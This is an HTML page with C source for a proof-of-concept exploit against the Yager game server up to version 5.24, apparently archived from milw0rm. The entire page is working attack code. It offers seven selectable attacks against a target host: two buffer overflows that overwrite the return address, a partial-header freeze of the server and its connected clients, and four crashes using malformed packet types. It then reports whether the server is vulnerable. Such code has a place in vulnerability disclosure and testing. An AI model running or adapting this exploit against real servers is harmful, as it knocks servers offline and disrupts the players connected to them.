<html>
<head>
<title>Yager <= 5.24 Multiple Denial of Service Exploit</title>
<pre>
/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}

    #define close   closesocket
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netinet/in.h&gt;
    #include &lt;netdb.h&gt;
#endif



#define VER         &quot;0.1&quot;
#define BUFFSZ      (HEADSZ + 65536)
#define PORT        34855
#define TIMEOUT     3
#define HEADSZ      10
#define EIP         &quot;\xde\xc0\xad\xde&quot;
#define CRASHSZ     100
#define NICKBOF     &quot;\x00\x00\x00\x00&quot;      /* vehicle type */ \
                    &quot;\x01\x00\x00\x00&quot;      /* team */ \
                    &quot;\xff\xff\xff\xff&quot;      /* nickname size, ignored! */ \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    EIP \
                    &quot;aaaaaaaaaaaaaaaa\0&quot;
#define PCKBOF      &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                    &quot;aa&quot; EIP

#define SHOW(x)     printf(x &quot;%n%s%n\n&quot;, &amp;tmp, p, &amp;len); \
                    p += (len - tmp) + 1;
#define SENDTO(x)   if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer)) \
                      &lt; 0) std_err();
#define RECVFROM    if(timeout(sd) &lt; 0) { \
                        fputs(&quot;\nError: socket timeout, no reply received\n\n&quot;, stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len &lt; 0) std_err();
#define SEND(x,y)   if(send(sd, x, y, 0) \
                      &lt; 0) std_err();



u_long resolv(char *host);
int timeout(int sock);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            tmp,
            autoport = 1;
    u_short port = PORT;
    u_char  *buff,
            info[] =
                &quot;Y_NET_YAGER_CLIENT\0&quot;
                &quot;\x00\x00&quot; &quot;\x00\x00&quot;,
            *p;
    struct yager_head {
        u_long  type;
        u_short size;
        u_short pck1;
        u_short pck2;
    } *yh;


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Yager &lt;= 5.24 multiple vulnerabilities &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 3) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;attack&gt; &lt;host&gt; [port(auto)]\n&quot;
            &quot;\n&quot;
            &quot;Attacks:\n&quot;
            &quot; 1 = nickname buffer-overflow\n&quot;
            &quot; 2 = big data buffer-overflow\n&quot;
            &quot; 3 = freeze of server and connected clients\n&quot;
            &quot; 4 = crash using type 0x1d (in 0x0050e970)\n&quot;
            &quot; 5 = crash using type 0x22 (in 0x004fd2b8)\n&quot;
            &quot; 6 = crash using type 0x24 (in 0x004fd2f5)\n&quot;
            &quot; 7 = crash using type 0x28 (in 0x004b0f1b)\n&quot;
            &quot;\n&quot;, argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    if(argc &gt; 3) {
        autoport = 0;
        port = atoi(argv[3]);
    }

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf(&quot;- target   %s : %hu\n&quot;,
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(autoport) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd &lt; 0) std_err();

        fputs(&quot;- request informations:\n&quot;, stdout);
        *(u_short *)(info + 19) = ~time(NULL);
        SENDTO(info);
        RECVFROM;
        close(sd);

        p = buff + 19;
        port = ntohs(*(u_short *)p);
        printf(&quot;\n  Server port   %d\n&quot;, port);
        p += 2;
        SHOW(&quot;  Map           &quot;);
        printf(&quot;  Version       %d.%d\n&quot;, p[1], p[0]);
        p += 2;
        SHOW(&quot;  Server name   &quot;);
        p += 4;
        printf(&quot;  Players       %d / %d\n\n&quot;, p[1], p[0]);

        peer.sin_port = htons(port);
    }

    attack = atoi(argv[1]);
    if(attack &gt; 7) {
        fputs(&quot;\nError: you have chosen a wrong attack number\n\n&quot;, stdout);
        exit(1);
    }

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd &lt; 0) std_err();

    if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
      &lt; 0) std_err();

    yh = (struct yager_head *)buff;
    yh-&gt;pck1 = tmp = ~time(NULL) &amp; 0xffff;
    yh-&gt;pck2 = 0;

    if(attack == 1) {
        yh-&gt;type = 0x1e;
        memcpy(buff + HEADSZ, NICKBOF, sizeof(NICKBOF) - 1);
        yh-&gt;size = sizeof(NICKBOF) - 1;
        fputs(&quot;- send long data block for nickname buffer-overflow\n&quot;, stdout);

    } else if(attack == 2) {
        yh-&gt;type = 0x00;    // almost any other type is ok
        memcpy(buff + HEADSZ, PCKBOF, sizeof(PCKBOF) - 1);
        yh-&gt;size = sizeof(PCKBOF) - 1;
        fputs(&quot;- send long data block for packet buffer-overflow\n&quot;, stdout);

    } else if(attack == 3) {
        yh-&gt;type = 0x1b;
        yh-&gt;size = 0;
        printf(&quot;- server waits for %d bytes but we send a partial header\n&quot;, HEADSZ);
        tmp %= HEADSZ;
        if(tmp &lt;= 0) tmp = 1;
        SEND(buff, tmp);
        fputs(&quot;  Server and connected clients should be freezed, press RETURN to stop the attack\n&quot;, stdout);
        fgetc(stdin);
        close(sd);
        return(0);

    } else {
        if(attack == 4) {
            yh-&gt;type = 0x1d;
        } else if(attack == 5) {
            yh-&gt;type = 0x22;
        } else if(attack == 6) {
            yh-&gt;type = 0x24;
        } else if(attack == 7) {
            yh-&gt;type = 0x28;
        }

        memset(buff + HEADSZ, 0xff, CRASHSZ);
        yh-&gt;size = CRASHSZ;
        printf(&quot;- send crash data with type 0x%08lx\n&quot;, yh-&gt;type);
    }

    SEND(buff, yh-&gt;size + HEADSZ);
    fputs(&quot;- check server status\n&quot;, stdout);
    if(!timeout(sd)) {
        if(recv(sd, buff, BUFFSZ, 0) &lt; 0) {
            fputs(&quot;\nServer IS vulnerable!!!\n\n&quot;, stdout);
        } else {
            fputs(&quot;\nServer doesn't seem vulnerable\n\n&quot;, stdout);
        }
    } else {
        fputs(&quot;\nNo reply from the server, it is probably not vulnerable\n\n&quot;, stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolv hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)hp-&gt;h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif

// milw0rm.com [2005-04-14]
</pre>
</html>

